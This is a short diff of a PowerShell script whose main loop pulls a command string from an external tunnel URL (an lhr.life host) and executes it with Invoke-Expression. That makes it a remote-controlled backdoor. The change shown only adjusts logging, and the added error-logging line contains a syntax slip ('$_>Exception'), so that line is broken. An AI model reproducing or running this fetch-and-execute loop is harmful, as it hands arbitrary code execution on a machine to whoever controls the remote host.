@@ -4,7 +4,7 @@ $url = "https://85a4b5f72ca9c6.lhr.life"
 function main {
     try {
         $cmd = (Invoke-WebRequest -Uri "$url/get").Content.Trim()
-        "Invoked Web Request to: $url/get" | Out-File -FilePath $log
+        "Invoked Web Request to: $url/get" | Out-File -Append -FilePath $log
         if ($cmd -and $cmd -ne "noop") {
             Invoke-Expression $cmd
         }
@@ -12,7 +12,7 @@ function main {
 
     catch
     {
-
+        "Error: $($_>Exception.Message)" | Out-File -Append -FilePath $log
     }
     Start-Sleep -Seconds 1
 }
